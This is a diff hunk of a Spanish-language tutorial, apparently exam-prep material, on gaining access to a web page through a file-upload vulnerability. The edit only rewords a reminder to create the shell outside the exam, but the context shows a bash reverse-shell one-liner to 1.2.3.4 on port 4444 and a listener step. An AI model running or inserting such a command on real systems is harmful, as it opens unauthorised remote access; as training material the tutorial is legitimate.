@@ -94,7 +94,7 @@ bash -c "sh -i >& /dev/tcp/1.2.3.4/4444 0>&1"
 
 Y en otra terminal, abrimos el puerto **4444** que se encuentra abierto y veremos que recibimos la conexión.
 
-Recuerden hacerlo fuera del examen ya que, dentro del examen, no hay internet.
+Recuerden hacerlo fuera del examen el ingreso a la página web para la creación de la shell ya que, dentro del examen, no hay internet.
 
 Así es como podemos ganar acceso a una página web con la vulnerabilidad de subir archivos y acceder a ella desde otra ubicación.
 
